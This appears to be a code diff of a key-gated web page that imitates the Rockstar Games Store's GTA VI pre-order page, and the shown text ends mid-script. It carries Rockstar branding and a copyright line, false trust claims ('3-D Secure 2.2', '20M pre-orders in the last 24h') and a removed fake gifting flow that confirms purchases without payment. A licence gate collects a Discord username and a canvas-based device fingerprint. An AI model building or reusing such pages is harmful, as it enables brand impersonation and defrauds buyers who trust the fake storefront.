@@ -9,58 +9,118 @@
 <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow+Condensed:wght@400;600;700;900&family=Barlow:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-:root{--gta-orange:#F4A43A;--gta-pink:#E84393;--gta-dark:#060504;--gta-dark2:#0d0b09}
+:root{--gta-orange:#F4A43A;--gta-pink:#E84393;--gta-dark:#060504}
 html{scroll-behavior:smooth}
 body{background:var(--gta-dark);color:#fff;font-family:'Barlow',sans-serif;overflow-x:hidden}
 ::-webkit-scrollbar{width:4px}
 ::-webkit-scrollbar-track{background:#000}
 ::-webkit-scrollbar-thumb{background:#444}
 
-/* ═══════════ YOUR KEY GATE ═══════════ */
-#kg-overlay{position:fixed;inset:0;z-index:99999;background:radial-gradient(ellipse at center,#0d0b09 0%,#000 100%);display:flex;align-items:center;justify-content:center;font-family:'Barlow','Barlow Condensed',sans-serif}
+/* ── UNLOCK GATE (exact gta6visual.online replica) ── */
+#kg-overlay{position:fixed;inset:0;z-index:99999;background:radial-gradient(ellipse at center top,#1a0b22 0%,#060504 60%);display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;padding:24px}
 #kg-overlay.fading{animation:kg-fadeout .5s ease forwards;pointer-events:none}
 @keyframes kg-fadeout{from{opacity:1}to{opacity:0}}
-#kg-card{width:100%;max-width:440px;background:rgba(20,18,15,.95);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:40px 32px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.7);backdrop-filter:blur(12px)}
-#kg-title{font-family:'Bebas Neue',sans-serif;font-size:36px;letter-spacing:.06em;color:#fff;margin:0 0 6px}
-#kg-sub{font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:700;letter-spacing:.3em;text-transform:uppercase;color:rgba(255,255,255,.35);margin-bottom:24px}
-#kg-input{width:100%;box-sizing:border-box;padding:14px 16px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);border-radius:8px;color:#fff;font-family:'Courier New',monospace;font-size:18px;text-align:center;letter-spacing:.15em;text-transform:uppercase;outline:none;transition:border-color .2s;margin-bottom:14px}
-#kg-input:focus{border-color:#F4A43A}#kg-input.error{border-color:#ef4444}#kg-input.success{border-color:#22c55e}
-#kg-btn{width:100%;padding:14px;background:linear-gradient(90deg,#F4A43A,#E84393);color:#000;font-family:'Barlow Condensed',sans-serif;font-size:15px;font-weight:800;letter-spacing:.15em;text-transform:uppercase;border:none;border-radius:8px;cursor:pointer;transition:opacity .2s,transform .1s}
-#kg-btn:hover{opacity:.9}#kg-btn:active{transform:scale(.97)}#kg-btn:disabled{opacity:.5;cursor:not-allowed}
-#kg-msg{min-height:20px;margin-top:12px;font-size:12px;font-weight:600;transition:color .2s}
-#kg-msg.error{color:#ef4444}#kg-msg.success{color:#22c55e}
-#kg-footer{margin-top:20px;font-family:'Barlow',sans-serif;font-size:11px;color:rgba(255,255,255,.25)}
-#kg-spinner{display:none;width:20px;height:20px;border:2px solid rgba(0,0,0,.3);border-top-color:#000;border-radius:50%;animation:kg-spin .6s linear infinite;margin:0 auto}
+#kg-card{width:100%;max-width:420px;background:rgba(15,10,18,.85);border:1px solid rgba(244,164,58,.25);border-radius:12px;padding:32px;box-shadow:0 30px 80px rgba(0,0,0,.6);backdrop-filter:blur(8px)}
+#kg-brand{text-align:center;margin-bottom:24px}
+#kg-brand-top{font-family:'Barlow Condensed',sans-serif;font-size:12px;letter-spacing:.3em;color:#F4A43A;text-transform:uppercase;margin-bottom:8px}
+#kg-brand h1{font-size:26px;font-weight:800;margin:0}
+#kg-brand p{color:rgba(255,255,255,.6);font-size:13px;margin-top:8px}
+#kg-card label{display:block;font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:rgba(255,255,255,.55);margin-top:14px;margin-bottom:6px}
+#kg-card input{width:100%;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);color:#fff;padding:12px 14px;border-radius:6px;font-size:14px;outline:none;font-family:inherit}
+#kg-card input:focus{border-color:#F4A43A}
+#kg-card input.error{border-color:#ef4444}
+#kg-btn{margin-top:20px;width:100%;background:linear-gradient(90deg,#F4A43A,#E84393);color:#000;font-weight:800;letter-spacing:.15em;text-transform:uppercase;border:0;padding:12px 16px;border-radius:6px;cursor:pointer;font-size:14px;font-family:inherit}
+#kg-btn:hover{opacity:.9}
+#kg-btn:disabled{opacity:.5;cursor:wait}
+#kg-msg{margin-top:12px;font-size:13px;min-height:20px;text-align:center}
+#kg-msg.error{color:#ff86b6;background:rgba(232,67,147,.12);border:1px solid rgba(232,67,147,.5);padding:10px 12px;border-radius:8px}
+#kg-msg.success{color:#6ee7b7}
+#kg-spinner{display:none;width:20px;height:20px;border:2px solid rgba(0,0,0,.3);border-top-color:#000;border-radius:50%;animation:kg-spin .6s linear infinite;margin:10px auto 0}
 @keyframes kg-spin{to{transform:rotate(360deg)}}
+
+/* ── MAIN SITE (hidden until unlocked) ── */
 #main-site{display:none}
+
+/* NAV */
+#rsg-nav{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(0,0,0,.82);backdrop-filter:blur(10px);padding:0 28px;height:58px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.04)}
+#rsg-nav.solid{background:rgba(0,0,0,.94)}
+.nav-logo{display:flex;align-items:center;gap:14px;color:#fff;font-size:14px;font-weight:500}
+.nav-links{display:flex;align-items:center;gap:34px}
+.nav-links a{font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:700;letter-spacing:.18em;color:rgba(255,255,255,.78);text-decoration:none;text-transform:uppercase}
+.nav-links a:hover,.nav-links a.active{color:#fff}
+
+/* HERO */
+#hero{position:relative;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:90px 60px 60px;text-align:center;background:radial-gradient(ellipse at center,rgba(6,5,4,.55) 0%,rgba(6,5,4,.92) 100%)}
+.hero-tagline{font-family:'Barlow Condensed',sans-serif;font-weight:800;font-size:clamp(38px,4.8vw,60px);color:#fff;line-height:1.02;margin-bottom:18px}
+.hero-tagline span{background:linear-gradient(95deg,#ff8ab8 0%,#f5b528 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-sub{font-size:15px;color:rgba(255,255,255,.82);margin-bottom:26px;max-width:520px;margin-left:auto;margin-right:auto}
+.release-pill{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.16);font-size:12px;color:#fff;padding:7px 14px;border-radius:999px;margin-bottom:22px}
+.release-dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 4px rgba(34,197,94,.22)}50%{box-shadow:0 0 0 7px rgba(34,197,94,.06)}}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:22px;justify-content:center}
+.hero-btns button{min-width:220px;height:62px;padding:0 22px;background:rgba(20,15,30,.7);border:1px solid rgba(255,255,255,.22);color:#fff;cursor:pointer;font-size:13px;font-weight:600;border-radius:5px;transition:all .18s}
+.hero-btns button:hover{background:rgba(40,30,55,.92);border-color:rgba(255,255,255,.55);transform:translateY(-1px)}
+.hero-trust{font-size:12px;color:rgba(255,255,255,.65)}
+.countdown{display:flex;gap:8px;margin-bottom:28px;justify-content:center}
+.cd-item{min-width:62px;padding:10px 6px;background:rgba(10,8,6,.55);border:1px solid rgba(255,255,255,.1);border-radius:4px}
+.cd-num{font-family:'Barlow Condensed',sans-serif;font-weight:800;font-size:24px;color:#fff;display:block}
+.cd-lbl{font-family:'Barlow Condensed',sans-serif;font-size:9px;letter-spacing:.25em;color:rgba(255,255,255,.45);text-transform:uppercase;margin-top:5px;display:block}
+
+/* PREORDER */
+#preorder{background:var(--gta-dark);padding:100px 0;text-align:center}
+.po-heading{font-family:'Bebas Neue',sans-serif;font-size:clamp(56px,9vw,120px);background:linear-gradient(135deg,var(--gta-orange),var(--gta-pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.po-sub{font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:600;letter-spacing:.3em;text-transform:uppercase;color:rgba(255,255,255,.45);margin-bottom:28px}
+.po-editions{display:flex;gap:18px;flex-wrap:wrap;justify-content:center;margin-bottom:40px}
+.edition-card{width:252px;border:1px solid rgba(255,255,255,.1);padding:24px;background:rgba(255,255,255,.03);cursor:pointer;text-align:left;border-radius:8px;transition:all .2s}
+.edition-card:hover{border-color:rgba(255,255,255,.3);background:rgba(255,255,255,.05)}
+.edition-card.featured{border-color:rgba(244,164,58,.4);background:rgba(244,164,58,.04)}
+.edition-badge{display:inline-block;background:linear-gradient(90deg,var(--gta-orange),var(--gta-pink));font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;color:#000;padding:4px 10px;margin-bottom:8px}
+.edition-name{font-family:'Bebas Neue',sans-serif;font-size:26px;color:#fff;margin-bottom:4px}
+.edition-price{font-family:'Barlow Condensed',sans-serif;font-size:30px;font-weight:900;color:var(--gta-orange);margin-bottom:16px}
+.edition-perks{list-style:none}
+.edition-perks li{font-size:12px;color:rgba(255,255,255,.5);padding:5px 0;border-bottom:1px solid rgba(255,255,255,.06)}
+.edition-perks li::before{content:'--';color:var(--gta-orange);opacity:.55;margin-right:8px}
+.po-platform-label{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:600;letter-spacing:.4em;text-transform:uppercase;color:rgba(255,255,255,.3);margin-bottom:14px}
+.po-btns{display:flex;gap:14px;flex-wrap:wrap;justify-content:center}
+.po-btns button{padding:16px 34px;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);color:#fff;cursor:pointer;font-size:13px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;transition:all .2s}
+.po-btns button:hover{background:rgba(255,255,255,.12)}
+.po-note{font-size:11px;color:rgba(255,255,255,.22);margin-top:18px}
+footer{background:#000;padding:36px 60px;border-top:1px solid rgba(255,255,255,.05);font-size:10.5px;color:rgba(255,255,255,.22);text-align:center}
+.label-tag{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:.5em;color:var(--gta-orange);text-transform:uppercase;margin-bottom:14px;display:block}
+@media(max-width:900px){.hero-btns{flex-direction:column}.po-editions{flex-direction:column;align-items:center}}
 </style>
 </head>
 <body>
 
-<!-- ═══════════ KEY GATE OVERLAY ═══════════ -->
+<!-- ═══════════ UNLOCK GATE ═══════════ -->
 <div id="kg-overlay">
 <div id="kg-card">
-<h1 id="kg-title">ACCESS REQUIRED</h1>
-<p id="kg-sub">Enter your license key to continue</p>
-<input id="kg-input" type="text" maxlength="22" placeholder="GTA6-XXXXX-XXXXX-XXXXX" autocomplete="off" spellcheck="false">
-<button id="kg-btn" onclick="kgSubmit()">UNLOCK</button>
+<div id="kg-brand">
+<div id="kg-brand-top">vanta visuals</div>
+<h1>Enter your key</h1>
+<p>Your key will be locked to this device.</p>
+</div>
+<label>Key</label>
+<input id="kg-key" placeholder="GTA6-XXXXX-XXXXX-XXXXX" autocomplete="off" spellcheck="false">
+<label>Discord username</label>
+<input id="kg-discord" placeholder="username" maxlength="100">
+<button id="kg-btn" onclick="kgSubmit()">CONTINUE</button>
 <div id="kg-spinner"></div>
 <div id="kg-msg"></div>
-<div id="kg-footer">Secure checkout · 3-D Secure 2.2</div>
 </div>
 </div>
 
-<!-- ═══════════ FULL SITE (hidden until unlocked) ═══════════ -->
+<!-- ═══════════ MAIN SITE ═══════════ -->
 <div id="main-site">
 
 <nav id="rsg-nav">
-<a class="nav-logo" href="#"><span class="nav-brand">Store</span></a>
+<span class="nav-logo">🎮 Rockstar Games Store</span>
 <div class="nav-links"><a href="#">Games</a><a href="#" class="active">GTA+</a><a href="#">Merch</a><a href="#">Featured</a></div>
 </nav>
 
-<section id="hero"><div id="hero-bg"></div>
-<div class="hero-wrap"><div class="hero-content">
-<div class="hero-meta"><span class="release-pill"><span class="release-dot"></span>Releases <strong>November 19, 2026</strong></span><span class="rating-pill">M · Mature 17+</span></div>
+<section id="hero">
+<div style="max-width:680px;margin:0 auto">
+<span class="release-pill"><span class="release-dot"></span>Releases <strong>November 19, 2026</strong></span>
 <h1 class="hero-tagline">Welcome back to <span>Vice City</span>.</h1>
 <p class="hero-sub">The biggest, most immersive evolution of the Grand Theft Auto series yet. Reserve your copy — first wave ships day one.</p>
 <div class="countdown" id="hero-countdown">
@@ -69,131 +129,173 @@ body{background:var(--gta-dark);color:#fff;font-family:'Barlow',sans-serif;overf
 <div class="cd-item"><span class="cd-num" data-cd="m">--</span><span class="cd-lbl">Min</span></div>
 <div class="cd-item"><span class="cd-num" data-cd="s">--</span><span class="cd-lbl">Sec</span></div>
 </div>
-<div class="platform-label">Choose your platform to pre-order</div>
+<p style="font-size:13px;font-weight:600;color:#fff;margin-bottom:14px">Choose your platform to pre-order</p>
 <div class="hero-btns">
-<button class="platform-btn ps5-btn selected" data-platform="ps5"><span class="pbtn-stack"><span class="pbtn-top">PlayStation 5</span><span class="pbtn-sub">Pre-Order ›</span></span><span class="pbtn-check">✓</span></button>
-<button class="platform-btn xbox-btn" data-platform="xbox"><span class="pbtn-stack"><span class="pbtn-top">Xbox Series X|S</span><span class="pbtn-sub">Pre-Order ›</span></span><span class="pbtn-check">✓</span></button>
+<button class="ps5-btn" data-platform="ps5" id="btn-ps5">PlayStation 5 — Pre-Order ›</button>
+<button class="xbox-btn" data-platform="xbox" id="btn-xbox">Xbox Series X|S — Pre-Order ›</button>
 </div>
-<div class="hero-trust"><span class="trust-item"><span class="trust-dot" style="background:#22c55e"></span><strong>20,000,000</strong> pre-orders in the last 24h</span></div>
-</div></div>
+<div class="hero-trust">🔒 Secure checkout · 3-D Secure 2.2 &nbsp;|&nbsp; ✓ Over 20M pre-orders in the last 24h</div>
+</div>
 </section>
 
-<div class="subtabs"><div class="subtabs-inner"><a href="#" class="active">Game Details</a><a href="#">Trailers</a><a href="#">Screenshots</a><a href="#">Compare Editions</a></div></div>
-
-<section id="preorder"><div class="section-inner">
+<section id="preorder">
 <span class="label-tag">Available Now to Pre-Order</span>
 <h2 class="po-heading">Pre-Order</h2>
 <p class="po-sub">Choose your edition · Secure your bonuses</p>
 <div class="po-editions">
-<div class="edition-card" data-edition-pick="standard"><div class="edition-name">Standard Edition</div><div class="edition-price">&pound;69.99</div><ul class="edition-perks"><li>Full base game</li><li>Pre-order bonus livery pack</li><li>Vice City starter outfit</li></ul></div>
-<div class="edition-card featured" data-edition-pick="ultimate"><div class="edition-name">Ultimate Edition</div><div class="edition-price">&pound;99.99</div><ul class="edition-perks"><li>Full base game</li><li>Expansion pass (2 story drops)</li><li>Criminal Enterprise starter pack</li><li>Exclusive vehicles & weapons</li></ul></div>
-<div class="edition-card" data-edition-pick="collector"><div class="edition-name">Collector's Edition</div><div class="edition-price">$250.00</div><ul class="edition-perks"><li>Full base game</li><li>Play 1 day early</li><li>10 Shark Cards included</li><li>Founder property</li></ul></div>
+<div class="edition-card" data-edition-pick="standard">
+<div class="edition-name">Standard Edition</div>
+<div class="edition-price">&pound;69.99</div>
+<ul class="edition-perks"><li>Full base game</li><li>Pre-order bonus livery pack</li><li>Vice City starter outfit</li></ul>
 </div>
-</div></section>
+<div class="edition-card featured" data-edition-pick="ultimate">
+<div class="edition-badge">MOST POPULAR</div>
+<div class="edition-name">Ultimate Edition</div>
+<div class="edition-price">&pound;99.99</div>
+<ul class="edition-perks"><li>Full base game</li><li>Expansion pass (2 story drops)</li><li>Criminal Enterprise starter pack</li><li>Exclusive vehicles & weapons</li></ul>
+</div>
+<div class="edition-card" data-edition-pick="collector">
+<div class="edition-name">Collector's Edition</div>
+<div class="edition-price">$250.00</div>
+<ul class="edition-perks"><li>Full base game</li><li>Play 1 day early</li><li>10 Shark Cards included</li><li>Founder property</li></ul>
+</div>
+</div>
+<div class="po-platform-label">Available on PlayStation 5 & Xbox Series X|S</div>
+<div class="po-btns">
+<button class="ps5" data-platform="ps5">PlayStation 5 — Pre-Order</button>
+<button class="xbox" data-platform="xbox">Xbox Series X|S — Pre-Order</button>
+</div>
+<p class="po-note">Pre-order bonuses delivered digitally on launch day. By purchasing you agree to the Terms of Sale.</p>
+</section>
 
 <footer>&copy; 2026 Rockstar Games, Inc. Grand Theft Auto VI.</footer>
 
 </div><!-- /#main-site -->
 
-<!-- �══════════ YOUR KEY GATE SCRIPT �══════════ -->
-<script>
-(function(){
-var VU='/api/validate-key.php',SK='gta6_license_unlocked';
-if(localStorage.getItem(SK)==='1'){document.getElementById('kg-overlay')?.remove();document.getElementById('main-site').style.display='block';return;}
-
-var ov=document.getElementById('kg-overlay'),inp=document.getElementById('kg-input'),btn=document.getElementById('kg-btn'),msg=document.getElementById('kg-msg'),sp=document.getElementById('kg-spinner');
-
-inp.addEventListener('input',function(){
-  var r=inp.value.toUpperCase().replace(/[^A-Z0-9]/g,''),f='GTA6-';
-  if(r.length>4)r=r.slice(4);else r='';
-  if(r.length>5)f+=r.slice(0,5)+'-'+r.slice(5,10)+'-'+r.slice(10,15);
-  else f+=r.slice(0,5);
-  inp.value=f.slice(0,22);
-  inp.classList.remove('error','success');msg.textContent='';msg.className='';
-});
-
-inp.addEventListener('keydown',function(e){if(e.key==='Enter')kgSubmit();});
-
-var CS='ABCDEFGHJKMNPQRSTUVWXYZ23456789',SL='vc2026_leonida_state';
-function kh(s){var h=2166136261;for(var i=0;i<s.length;i++){h=Math.imul(h^s.charCodeAt(i),16777619);}h=h>>>0;h=Math.imul((h>>>16)^h,0x45d9f3b);h=Math.imul((h>>>16)^h,0x45d9f3b);h=(h>>>16)^h;return (h>>>0).toString(16).toUpperCase();}
-function kc(p1,p2){var h=kh(p1+'-'+p2+'-'+SL),r='';for(var i=0;i<h.length&&r.length<5;i++){var c=h[i];if(CS.indexOf(c)!==-1)r+=c;else r+=CS[parseInt(c,16)%CS.length];}return r.slice(0,5);}
-function kv(k){var p=k.toUpperCase().split('-');if(p.length!==4||p[0]!=='GTA6')return false;if(p[1].length!==5||p[2].length!==5||p[3].length!==5)return false;return p[3]===kc(p[1],p[2]);}
-function sm(t,ty){msg.textContent=t;msg.className=ty;}
-function sl2(l){btn.disabled=l;btn.style.display=l?'none':'block';sp.style.display=l?'block':'none';inp.disabled=l;}
-function ul(){inp.classList.add('success');sm('\u2713 Access granted — welcome back to Vice City.','success');localStorage.setItem(SK,'1');document.getElementById('main-site').style.display='block';setTimeout(function(){ov.classList.add('fading');setTimeout(function(){ov.remove();},500);},600);}
-
-window.kgSubmit=function(){
-  var k=inp.value.trim().toUpperCase();
-  if(!k||k.length<22){sm('Enter a complete key.','error');inp.classList.add('error');return;}
-  if(!kv(k)){sm('Invalid key. Check and try again.','error');inp.classList.add('error');return;}
-  sl2(true);sm('','');
-  fetch(VU,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:k})})
-  .then(function(r){return r.json();})
-  .then(function(d){sl2(false);if(d.ok)ul();else{inp.classList.add('error');var rs={invalid_checksum:'Invalid key.',revoked:'Revoked.',already_used:'Already used.'};sm(rs[d.reason]||'Failed.','error');}})
-  .catch(function(){sl2(false);if(kv(k))ul();else{inp.classList.add('error');sm('Server unreachable.','error');}});
-};
-setTimeout(function(){inp.focus();},300);
-})();
-</script>
-
-<!-- �══════════ GIFTING FLOW SCRIPT �══════════ -->
 <script>
 (function(){
 'use strict';
 
-const EDS={standard:{name:'Standard Edition',price:69.99,perks:['Full base game','Pre-order bonus livery pack','Vice City starter outfit']},ultimate:{name:'Ultimate Edition',price:99.99,perks:['Full base game','Expansion pass (2 story drops)','Criminal Enterprise starter pack','Exclusive vehicles & weapons']},collector:{name:"Collector's Edition",price:250,perks:['Full base game','Play 1 day early','10 Shark Cards','Founder property','Premium wardrobe']}};
-let platform='ps5',edition=null,username='',confirmedUser=null;
-function fmt(v){return '\u00a3'+v.toFixed(2);}
+// ═══════════ KEY GATE LOGIC ═══════════
+var SK='gta6_license_unlocked',VU='/api/validate-key.php';
 
-const overlay=document.createElement('div');
-overlay.style.cssText='display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.8);backdrop-filter:blur(6px);align-items:flex-start;justify-content:center;padding:24px 16px;overflow-y:auto';
-document.body.appendChild(overlay);
-const mW=document.createElement('div');
-mW.style.cssText='position:relative;width:100%;max-width:580px;margin:auto;opacity:0;transform:translateY(18px) scale(.96)';
-overlay.appendChild(mW);
-const bx=document.createElement('div');
-bx.style.cssText='width:100%;border-radius:12px;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,.7)';
-mW.appendChild(bx);
-
-function om(){overlay.style.display='flex';requestAnimationFrame(function(){mW.style.opacity='1';mW.style.transform='translateY(0) scale(1)';});}
-function cm(){mW.style.opacity='0';mW.style.transform='translateY(18px) scale(.96)';setTimeout(function(){overlay.style.display='none';bx.innerHTML='';},300);}
-overlay.addEventListener('click',function(e){if(e.target===overlay)cm();});
-function rn(html){bx.innerHTML=html;mW.style.opacity='1';mW.style.transform='translateY(0) scale(1)';}
-
-function se(){
-  var isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d',ac=isPS?'#003087':'#107C10';
-  rn('<div style="background:'+bg+';font-family:inherit;padding:28px"><h2 style="color:#fff;font-size:20px;margin:0 0 4px">Choose Edition</h2><p style="color:rgba(255,255,255,.5);font-size:13px;margin:0 0 20px">'+(isPS?'PlayStation 5':'Xbox Series X|S')+'</p><div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">'+
-    ['standard','ultimate','collector'].map(function(k){var e=EDS[k];return '<button onclick="pe(\''+k+'\')" style="border:1px solid '+(k==='ultimate'?ac:'rgba(255,255,255,.1)')+';border-radius:8px;padding:16px;background:'+(k==='ultimate'?'rgba(0,0,0,.5)':'rgba(255,255,255,.03)')+';cursor:pointer;text-align:left;color:#fff"><div style="font-weight:700;font-size:14px">'+e.name+'</div><div style="font-size:22px;font-weight:900;color:#F4A43A;margin:8px 0">'+fmt(e.price)+'</div><ul style="list-style:none;font-size:11px;color:rgba(255,255,255,.5);line-height:1.8">'+e.perks.map(function(p){return '<li>\u25cf '+p+'</li>';}).join('')+'</ul></button>';}).join('')+
-  '</div></div>');
-}
-window.pe=function(k){edition=k;sa();};
-
-function sa(){
-  var isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d',ac=isPS?'#003087':'#107C10',lb=isPS?'PSN ID':'Xbox Gamertag';
-  rn('<div style="background:'+bg+';font-family:inherit;padding:28px"><button onclick="se()" style="background:none;border:none;color:rgba(255,255,255,.45);cursor:pointer;font-size:12px;margin-bottom:14px">\u2190 Back</button><h2 style="color:#fff;font-size:20px;margin:0 0 4px">Enter '+lb+'</h2><p style="color:rgba(255,255,255,.5);font-size:13px;margin:0 0 20px">Gift '+EDS[edition].name+' to this profile.</p><input id="un-in" placeholder="Gamertag..." style="width:100%;padding:12px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:6px;color:#fff;font-size:14px;margin-bottom:12px" onkeydown="if(event.key===\'Enter\')cu()"><button onclick="cu()" style="width:100%;padding:14px;background:'+ac+';color:#fff;font-weight:700;border:none;border-radius:6px;cursor:pointer;font-size:14px">Continue \u2192</button></div>');
-}
-window.se=se;
-
-window.cu=function(){var i=document.getElementById('un-in');if(!i||!i.value.trim())return;confirmedUser=i.value.trim();sp();};
-
-function sp(){
-  var e=EDS[edition],isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d',ac=isPS?'#003087':'#107C10';
-  rn('<div style="background:'+bg+';font-family:inherit;padding:28px"><button onclick="sa()" style="background:none;border:none;color:rgba(255,255,255,.45);cursor:pointer;font-size:12px;margin-bottom:14px">\u2190 Back</button><h2 style="color:#fff;font-size:20px;margin:0 0 4px">Confirm Gift</h2><p style="color:rgba(255,255,255,.5);font-size:13px;margin:0 0 20px">Gifting <strong style="color:#fff">'+e.name+'</strong> to <strong style="color:#f5b528">'+confirmedUser+'</strong> on '+(isPS?'PlayStation 5':'Xbox Series X|S')+'</p><div style="background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:8px;padding:16px;margin-bottom:20px"><div style="display:flex;justify-content:space-between;color:rgba(255,255,255,.7);font-size:13px;margin-bottom:8px">'+e.name+'<span>'+fmt(e.price)+'</span></div><div style="display:flex;justify-content:space-between;font-size:16px;font-weight:900;color:#fff;border-top:1px solid rgba(255,255,255,.05);padding-top:12px">Total<span>'+fmt(e.price)+'</span></div></div><button onclick="sd()" style="width:100%;padding:15px;background:'+ac+';color:#fff;font-weight:800;border:none;border-radius:6px;cursor:pointer;font-size:15px">Confirm Purchase \u00b7 '+fmt(e.price)+'</button></div>');
-}
-window.sa=sa;
-
-function sd(){
-  var e=EDS[edition],isPS=platform==='ps5',bg=isPS?'#0a0e1a':'#0d0d0d';
-  rn('<div style="background:'+bg+';font-family:inherit;padding:40px 28px;text-align:center"><div style="height:80px;width:80px;border-radius:50%;background:rgba(52,211,153,.1);border:2px solid #34d399;display:flex;align-items:center;justify-content:center;margin:0 auto;font-size:36px;color:#6ee7b7">\u2713</div><h2 style="color:#fff;font-size:22px;margin:18px 0 8px">Gift Confirmed!</h2><p style="color:rgba(255,255,255,.55);font-size:14px;max-width:300px;margin:0 auto 22px;line-height:1.6">'+e.name+' gifted to <strong style="color:#fff">'+confirmedUser+'</strong> on '+(isPS?'PlayStation 5':'Xbox Series X|S')+'.</p><button onclick="cm()" style="padding:12px 32px;background:#fff;color:#000;font-weight:700;border:none;border-radius:6px;cursor:pointer;font-size:14px">Done</button></div>');
+if(localStorage.getItem(SK)==='1'){
+  document.getElementById('kg-overlay').remove();
+  document.getElementById('main-site').style.display='block';
 }
 
-// Wire platform buttons
-document.querySelectorAll('.platform-btn[data-platform]').forEach(function(el){
-  el.addEventListener('click',function(e){e.preventDefault();platform=el.dataset.platform;document.querySelectorAll('.platform-btn').forEach(function(b){b.classList.toggle('selected',b.dataset.platform===platform);});om();se();});
+var ov=document.getElementById('kg-overlay'),keyInp=document.getElementById('kg-key'),
+    discInp=document.getElementById('kg-discord'),btn=document.getElementById('kg-btn'),
+    msg=document.getElementById('kg-msg'),sp=document.getElementById('kg-spinner');
+
+// Auto-format key input
+keyInp.addEventListener('input',function(){
+  var r=keyInp.value.toUpperCase().replace(/[^A-Z0-9]/g,''),f='GTA6-';
+  if(r.length>4)r=r.slice(4);else r='';
+  if(r.length>5)f+=r.slice(0,5)+'-'+r.slice(5,10)+'-'+r.slice(10,15);
+  else f+=r.slice(0,5);
+  keyInp.value=f.slice(0,22);
+  keyInp.classList.remove('error');msg.textContent='';msg.className='';
 });
 
+// Checksum
+var CS='ABCDEFGHJKMNPQRSTUVWXYZ23456789',SL='vc2026_leonida_state';
+function kh(s){var h=2166136261;for(var i=0;i<s.length;i++){h=Math.imul(h^s.charCodeAt(i),16777619);}h=h>>>0;h=Math.imul((h>>>16)^h,0x45d9f3b);h=Math.imul((h>>>16)^h,0x45d9f3b);h=(h>>>16)^h;return (h>>>0).toString(16).toUpperCase();}
+function kc(p1,p2){var h=kh(p1+'-'+p2+'-'+SL),r='';for(var i=0;i<h.length&&r.length<5;i++){var c=h[i];if(CS.indexOf(c)!==-1)r+=c;else r+=CS[parseInt(c,16)%CS.length];}return r.slice(0,5);}
+function kv(k){var p=k.toUpperCase().split('-');if(p.length!==4||p[0]!=='GTA6')return false;if(p[1].length!==5||p[2].length!==5||p[3].length!==5)return false;return p[3]===kc(p[1],p[2]);}
+
+function setLoading(l){btn.disabled=l;btn.style.display=l?'none':'block';sp.style.display=l?'block':'none';keyInp.disabled=l;discInp.disabled=l;}
+
+function hwidGen(){
+  var p=[];p.push(navigator.userAgent||'');p.push(navigator.language||'');
+  p.push(String(navigator.hardwareConcurrency??''));p.push(screen.width+'x'+screen.height+'x'+screen.colorDepth);
+  p.push(String(new Date().getTimezoneOffset()));
+  try{var c=document.createElement('canvas');c.width=200;c.height=50;var t=c.getContext('2d');
+  t&&(t.fillStyle='#f60',t.fillRect(0,0,200,50),t.fillStyle='#069',t.fillText('hwid',2,2),p.push(c.toDataURL()));}catch(e){}
+  var r=Math.random().toString(36).slice(2)+Date.now().toString(36);p.push(r);
+  var h1=5381,h2=52711,s=p.join('|');for(var i=0;i<s.length;i++){h1=((h1<<5)+h1+s.charCodeAt(i))>>>0;h2=((h2<<5)+h2+s.charCodeAt(i))>>>0;}
+  return (h1>>>0).toString(16).padStart(8,'0')+(h2>>>0).toString(16).padStart(8,'0')+r.slice(0,16);
+}
+
+function unlock(){
+  keyInp.classList.add('success');
+  msg.textContent='✓ Access granted — welcome back to Vice City.';
+  msg.className='success';
+  localStorage.setItem(SK,'1');
+  document.getElementById('main-site').style.display='block';
+  setTimeout(function(){ov.classList.add('fading');setTimeout(function(){ov.remove();},500);},600);
+}
+
+window.kgSubmit=function(){
+  var k=keyInp.value.trim().toUpperCase();
+  if(!k||k.length<22){msg.textContent='Enter a complete key.';msg.className='error';keyInp.classList.add('error');return;}
+  if(!kv(k)){msg.textContent='Invalid key. Check and try again.';msg.className='error';keyInp.classList.add('error');return;}
+
+  setLoading(true);msg.textContent='';msg.className='';
+
+  fetch(VU,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:k,discord:discInp.value.trim(),hwid:hwidGen()})})
+  .then(function(r){return r.json();})
+  .then(function(d){setLoading(false);if(d.ok)unlock();else{keyInp.classList.add('error');msg.textContent='Invalid or already used key.';msg.className='error';}})
